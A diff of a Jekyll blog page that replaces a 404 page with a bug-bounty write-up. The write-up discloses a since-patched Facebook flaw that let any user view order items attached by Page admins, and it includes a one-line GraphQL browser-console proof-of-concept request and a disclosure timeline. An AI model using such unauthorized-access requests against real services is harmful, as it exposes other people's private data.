@@ -3,17 +3,19 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
-<title>Waseem Ullah Siddiqui | The goal of this blog is to share write-ups about bugs and CTF solutions.</title>
+<title>See recent order items of any Facebook page | Waseem Ullah Siddiqui</title>
 <meta name="generator" content="Jekyll v4.0.0" />
-<meta property="og:title" content="Waseem Ullah Siddiqui" />
+<meta property="og:title" content="See recent order items of any Facebook page" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="The goal of this blog is to share write-ups about bugs and CTF solutions." />
-<meta property="og:description" content="The goal of this blog is to share write-ups about bugs and CTF solutions." />
-<link rel="canonical" href="http://localhost:4000/404.html" />
-<meta property="og:url" content="http://localhost:4000/404.html" />
+<meta name="description" content="When Page admin adds the “Order Placed” label to the user message, Page admin can also include the details of the order such as item name, notes, image, etc. This bug allow any user to view these order items of any Facebook page." />
+<meta property="og:description" content="When Page admin adds the “Order Placed” label to the user message, Page admin can also include the details of the order such as item name, notes, image, etc. This bug allow any user to view these order items of any Facebook page." />
+<link rel="canonical" href="http://localhost:4000/blog/2020/08/05/See-recent-order-items-of-any-Facebook-page.html" />
+<meta property="og:url" content="http://localhost:4000/blog/2020/08/05/See-recent-order-items-of-any-Facebook-page.html" />
 <meta property="og:site_name" content="Waseem Ullah Siddiqui" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-08-05T22:44:46-07:00" />
 <script type="application/ld+json">
-{"@type":"WebPage","url":"http://localhost:4000/404.html","headline":"Waseem Ullah Siddiqui","description":"The goal of this blog is to share write-ups about bugs and CTF solutions.","@context":"https://schema.org"}</script>
+{"@type":"BlogPosting","url":"http://localhost:4000/blog/2020/08/05/See-recent-order-items-of-any-Facebook-page.html","headline":"See recent order items of any Facebook page","dateModified":"2020-08-05T22:44:46-07:00","datePublished":"2020-08-05T22:44:46-07:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/2020/08/05/See-recent-order-items-of-any-Facebook-page.html"},"description":"When Page admin adds the “Order Placed” label to the user message, Page admin can also include the details of the order such as item name, notes, image, etc. This bug allow any user to view these order items of any Facebook page.","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 <link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Waseem Ullah Siddiqui" /></head>
 <body><header class="site-header" role="banner">
@@ -33,26 +35,38 @@
 </header>
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
-        <style type="text/css" media="screen">
-  .container {
-    margin: 10px auto;
-    max-width: 600px;
-    text-align: center;
-  }
-  h1 {
-    margin: 30px 0;
-    font-size: 4em;
-    line-height: 1;
-    letter-spacing: -1px;
-  }
-</style>
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
 
-<div class="container">
-  <h1>404</h1>
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">See recent order items of any Facebook page</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2020-08-05T22:44:46-07:00" itemprop="datePublished">Aug 5, 2020
+      </time></p>
+  </header>
 
-  <p><strong>Page not found :(</strong></p>
-  <p>The requested page could not be found.</p>
-</div>
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>When Page admin adds the “Order Placed” label to the user message, Page admin can also include the details of the order such as item name, notes, image, etc. This bug allow any user to view these order items of any Facebook page. 
+<br /></p>
+
+<p><strong>Proof of concept</strong></p>
+
+<p>Send the following request in the browser console by replacing {Page_ID} with the ID of the target page.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>new AsyncRequest('/api/graphql/').setData({variables:'{"pageID":"{Page_ID}"}',doc_id:2571623202931955}).send()
+</code></pre></div></div>
+
+<p>The response would contain the recent order items of the targeted page.</p>
+
+<p><strong>Timeline</strong>	
+<br /></p>
+
+<p>30 March 2020 - Report Sent<br />
+1 April 2020 - Acknowledged by Facebook<br />
+2 April 2020 - Fixed by Facebook<br />
+3 April 2020 - Confirmation of patch by me<br />
+9 April 2020 - Bounty Awarded by Facebook</p>
+
+  </div><a class="u-url" href="/blog/2020/08/05/See-recent-order-items-of-any-Facebook-page.html" hidden></a>
+</article>
 
       </div>
     </main><script src="https://use.fontawesome.com/c917585dea.js"></script>
